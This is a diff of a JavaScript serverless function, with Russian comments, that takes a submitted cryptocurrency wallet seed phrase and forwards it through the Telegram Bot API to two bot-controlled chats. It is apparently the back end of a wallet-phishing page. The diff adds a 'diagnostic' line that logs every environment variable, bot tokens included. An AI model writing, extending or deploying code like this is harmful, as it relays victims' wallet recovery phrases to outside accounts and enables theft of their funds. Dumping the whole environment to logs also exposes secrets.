@@ -1,6 +1,6 @@
 const https = require('https');
 
-// Вспомогательная функция для отправки сообщения конкретному боту
+// Вспомогательная функция для отправки сообщения (остается без изменений)
 const sendMessageToBot = (botToken, chatId, message) => {
     return new Promise((resolve, reject) => {
         const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -37,14 +37,17 @@ const sendMessageToBot = (botToken, chatId, message) => {
 
 
 exports.handler = async (event) => {
+    // --- ДИАГНОСТИЧЕСКАЯ СТРОКА ---
+    // Выводим в лог все переменные окружения, которые "видит" функция
+    console.log('Environment Variables Received by Function:', JSON.stringify(process.env));
+    // -----------------------------
+
     if (event.httpMethod !== 'POST') {
         return { statusCode: 405, body: 'Method Not Allowed' };
     }
 
-    // Получаем все 4 переменные окружения
     const { BOT_TOKEN_1, CHAT_ID_1, BOT_TOKEN_2, CHAT_ID_2 } = process.env;
 
-    // Проверяем, что все переменные настроены
     if (!BOT_TOKEN_1 || !CHAT_ID_1 || !BOT_TOKEN_2 || !CHAT_ID_2) {
         return { 
             statusCode: 500, 
@@ -78,13 +81,11 @@ exports.handler = async (event) => {
 <pre>${escapeHTML(seedPhrase)}</pre>
         `;
 
-        // Создаем массив промисов для отправки сообщений обоим ботам
         const sendPromises = [
             sendMessageToBot(BOT_TOKEN_1, CHAT_ID_1, message),
             sendMessageToBot(BOT_TOKEN_2, CHAT_ID_2, message)
         ];
 
-        // Ожидаем выполнения всех отправок одновременно
         await Promise.all(sendPromises);
 
         return {
